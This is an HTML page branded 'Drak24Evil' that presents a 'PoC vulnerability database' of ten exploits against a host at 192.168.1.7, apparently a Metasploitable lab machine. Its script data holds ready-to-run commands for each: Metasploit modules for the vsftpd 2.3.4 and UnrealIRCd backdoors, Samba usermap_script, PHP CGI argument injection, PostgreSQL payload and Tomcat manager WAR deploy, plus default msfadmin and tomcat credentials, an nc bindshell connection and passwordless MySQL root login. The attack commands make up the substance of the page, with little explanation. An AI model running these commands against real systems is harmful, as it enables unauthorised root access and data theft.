<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drak24Evil | Pro PoC Terminal</title>
    <style>
        :root {
            --cyber-blue: #00d4ff;
            --critical-red: #ff3e3e;
            --high-orange: #ff9d00;
            --dark-bg: #0a0b0c;
            --card-bg: #14171a;
            --accent-green: #00ff41;
            --modal-bg: #111;
        }

        body {
            background-color: var(--dark-bg);
            color: #e1e1e1;
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 0;
        }

        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }

        header {
            background: var(--card-bg);
            padding: 20px;
            border-bottom: 3px solid var(--cyber-blue);
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            border-radius: 0 0 10px 10px;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid #333;
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.2s;
            position: relative;
        }

        .card:hover { border-color: var(--cyber-blue); background: #1c2024; }

        .port-num { color: var(--cyber-blue); font-weight: bold; font-family: monospace; }
        
        /* Modal Style */
        .modal-overlay {
            display: none;
            position: fixed;
            z-index: 9999;
            left: 0; top: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(5px);
        }

        .modal-box {
            background: var(--modal-bg);
            margin: 5% auto;
            padding: 25px;
            width: 90%;
            max-width: 650px;
            border: 1px solid var(--cyber-blue);
            border-radius: 12px;
            position: relative;
            max-height: 85vh;
            overflow-y: auto;
        }

        .close-btn {
            position: absolute;
            top: 15px; right: 20px;
            font-size: 24px; color: #fff;
            cursor: pointer;
        }

        .poc-label { color: var(--cyber-blue); font-size: 0.75em; text-transform: uppercase; font-weight: bold; margin-top: 15px; display: block; }
        .poc-content { background: #000; padding: 12px; border-radius: 6px; margin-top: 4px; border-left: 3px solid var(--accent-green); font-family: monospace; font-size: 0.9em; }

        .sev-tag { padding: 3px 8px; border-radius: 4px; font-size: 0.7em; font-weight: bold; float: right; }
        .crit { background: var(--critical-red); color: white; }

        .telegram-btn { background: #24A1DE; color: white; text-decoration: none; padding: 8px 15px; border-radius: 5px; font-size: 0.9em; }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div>
            <h2 style="margin:0; color:var(--cyber-blue);">DRAK24EVIL AUDIT</h2>
            <small style="color:#666;">POC VULNERABILITY DATABASE</small>
        </div>
        <a href="https://t.me/Drak24Evil" class="telegram-btn" target="_blank">Telegram</a>
    </header>

    <div class="grid" id="mainGrid">
        </div>
</div>

<div id="pocModal" class="modal-overlay">
    <div class="modal-box">
        <span class="close-btn" id="closeModal">&times;</span>
        <div id="pocBody"></div>
    </div>
</div>

<script>
const data = [
    { p: "21", n: "vsftpd 2.3.4 Backdoor", s: "Critical", tool: "Metasploit", m: "Triggered by ':)' in user string.", i: "Full Root RCE", e: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit" },
    { p: "22", n: "SSH Default Credentials", s: "High", tool: "SSH Client", m: "Brute force / Default check.", i: "System Access", e: "ssh msfadmin@192.168.1.7\nPassword: msfadmin" },
    { p: "23", n: "Telnet Cleartext Login", s: "High", tool: "Telnet", m: "Insecure protocol sniffing.", i: "Credential Theft", e: "telnet 192.168.1.7\nLogin: msfadmin / msfadmin" },
    { p: "80", n: "PHP CGI Arg Injection", s: "Critical", tool: "Metasploit", m: "Query string manipulation.", i: "Web Server RCE", e: "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS 192.168.1.7\nrun" },
    { p: "445", n: "Samba Usermap Script", s: "Critical", tool: "Metasploit", m: "Username field injection.", i: "Root Shell", e: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit" },
    { p: "1524", n: "Ingreslock Bindshell", s: "Critical", tool: "Netcat", m: "Direct unauthenticated access.", i: "Root Shell", e: "nc 192.168.1.7 1524" },
    { p: "3306", n: "MySQL No Password", s: "High", tool: "MySQL Client", m: "Default config error.", i: "Database Leak", e: "mysql -h 192.168.1.7 -u root" },
    { p: "5432", n: "PostgreSQL Payload Exec", s: "Critical", tool: "Metasploit", m: "UDF library injection.", i: "Database RCE", e: "use exploit/linux/postgres/postgres_payload\nset RHOSTS 192.168.1.7\nexploit" },
    { p: "6667", n: "UnrealIRCd Backdoor", s: "Critical", tool: "Metasploit", m: "Compromised source code.", i: "RCE", e: "use exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.1.7\nexploit" },
    { p: "8180", n: "Tomcat Manager Deploy", s: "Critical", tool: "Metasploit", m: "Weak credentials + WAR upload.", i: "Application RCE", e: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nexploit" }
];

const grid = document.getElementById('mainGrid');
const modal = document.getElementById('pocModal');
const pocBody = document.getElementById('pocBody');

// Create Cards
data.forEach((item, index) => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `<span class="port-num">PORT ${item.p}</span><span class="sev-tag crit">${item.s}</span><h3>${item.n}</h3>`;
    card.addEventListener('click', () => showPoc(index));
    grid.appendChild(card);
});

function showPoc(i) {
    const v = data[i];
    pocBody.innerHTML = `
        <h2 style="color:var(--critical-red); border-bottom:1px solid #333; padding-bottom:10px;">POC REPORT: ${v.n}</h2>
        <span class="poc-label">TARGET IP</span><div class="poc-content">192.168.1.7</div>
        <span class="poc-label">TOOL USED</span><div class="poc-content">${v.tool}</div>
        <span class="poc-label">METHODOLOGY</span><div class="poc-content">${v.m}</div>
        <span class="poc-label">BUSINESS IMPACT</span><div class="poc-content">${v.i}</div>
        <span class="poc-label">EXPLOIT POC COMMANDS</span><div class="poc-content" style="color:var(--accent-green); white-space:pre-wrap;">${v.e}</div>
    `;
    modal.style.display = 'block';
}

document.getElementById('closeModal').onclick = () => modal.style.display = 'none';
window.onclick = (e) => { if(e.target == modal) modal.style.display = 'none'; }
</script>

</body>
</html>
